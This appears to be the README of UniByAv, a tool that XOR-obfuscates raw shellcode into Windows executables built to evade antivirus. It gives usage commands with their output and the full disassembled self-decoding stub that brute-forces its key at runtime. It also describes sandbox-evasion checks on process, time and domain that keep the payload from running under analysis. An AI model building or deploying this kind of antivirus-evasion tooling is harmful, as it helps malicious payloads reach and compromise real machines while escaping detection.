# UniByAv
UniByAv is a simple obfuscator that take raw shellcode and generate executable that are Anti-Virus friendly.

The obfuscation routine is purely writtend in assembly to remain pretty short and efficient. In a nutshell the application generate a 32 bits xor key and brute force the key at run time then perform the decryption of the actually shellcode.

I'm going to update the code over the time to also support some of the evasion technique that I was using.

# Usage
```
$ python UniByAv4.1.py shellcode test.exe /cygdrive/c/Program\ Files\ \(x86\)/CodeBlocks/MinGW/bin/
UniByAv4.1 Shellcode encoder tool / Mr.Un1k0d3r RingZer0 Team 2014
Currently running under (cygwin) LINUX switch is set to 0
Self decoding payload written in assembly

[+]     Generating xoring key
[+]     Xoring key is set to 0x150014cc
[+]     Original shellcode size is (13) bytes adding (3) bytes to align it
[+]     Magic key is set to \x49\x62\x4d\x6b
[+]     Payload + decoder shellcode length is now (134) bytes
[+]     Generating the final c file
[+]     Generating random charset array for kernel32 and SetProcessDEPPolicy
[+]     Generating int array for "kernel32.dll". Array size is: 12
[+]     Generating int array for "SetProcessDEPPolicy". Array size is: 19
[+]     Compiling the final executable
[+]     /cygdrive/c/Users/Mr.Un1k0d3r/Desktop/output/test.exe has been created
[+]     Generation completed
```

![image](https://user-images.githubusercontent.com/4238766/29378637-d3e9c4e8-828d-11e7-9ce2-83e18a1ee931.png)

Setting the gccpath to none will only generate the C file
```
$ python UniByAv4.1.py SHELLCODE malicious.exe none configs/process-evasion.json
UniByAv4.1 Shellcode encoder tool / Mr.Un1k0d3r RingZer0 Team 2014
Currently running under (cygwin) LINUX switch is set to 0
Self decoding payload written in assembly


[+]     *** Loading process evasion module
[+]     Generating xoring key
[+]     Xoring key is set to 0x1e1be916
[+]     Original shellcode size is (5) bytes adding (3) bytes to align it
[+]     Magic key is set to \x52\x42\x4e\x78
[+]     Payload + decoder shellcode length is now (66) bytes
[+]     Generating the final c file
[+]     Generating random charset array for kernel32 and SetProcessDEPPolicy
[+]     Generating int array for "kernel32.dll". Array size is: 12
[+]     Generating int array for "SetProcessDEPPolicy". Array size is: 19
[+]     /cygdrive/c/Users/Mr.Un1k0d3r/Desktop/UniByAv/output/malicious.exe.c has been created
[+]     Generation completed
```

# The actual decoder

This tool rely on a simple assembly stub to decode the encoded shellcode. As you can see the key is unknown and it get brute forced at runtime. Since the loop is writting in assembly doing millions of rounds is fairly fast on a modern system.

```
Decoder assembly:
   0:   eb 2f                   jmp    31 
   2:   58                      pop    eax
   3:   31 c9                   xor    ecx,ecx
   5:   89 cb                   mov    ebx,ecx
   7:   6a 04                   push   0x4
   9:   5a                      pop    edx
   a:   43                      inc    ebx
   b:   ff 30                   push   DWORD PTR [eax]
   d:   59                      pop    ecx
   e:   0f c9                   bswap  ecx
  10:   31 d9                   xor    ecx,ebx
  12:   81 f9 41 75 49 48       cmp    ecx,[MAGIC]
  18:   75 f0                   jne    a 
  1a:   0f cb                   bswap  ebx
  1c:   31 c9                   xor    ecx,ecx
  1e:   81 c1 05 00 00 00       add    ecx,[NUMBER_OF_CHUNK]
  24:   01 d0                   add    eax,edx
  26:   31 18                   xor    DWORD PTR [eax],ebx
  28:   e2 fa                   loop   24 
  2a:   2d 14 00 00 00          sub    eax,[FULL_SIZE]
  2f:   ff e0                   jmp    eax
  31:   e8 cc ff ff ff          call   2 
  [OPCODE] 
```

# Evasion technique 

Predefined configuation file can be found in configs folder.

###### process
Check if a specific process is running. If it does not run the binary exit without running the payload.

###### time
Check if SleepEx was hooked. If it return bogus information it exit without running the payload.

###### domain
Check if the current user is part of the defined domain. If it is not the case it exit without running the payload.

# Requirement
On Windows
```
python
MinGW (shipped with CodeBlocks)
```

On Linux
```
python
wine
MinGW
```

# Credit
Mr.Un1k0d3r RingZer0 Team
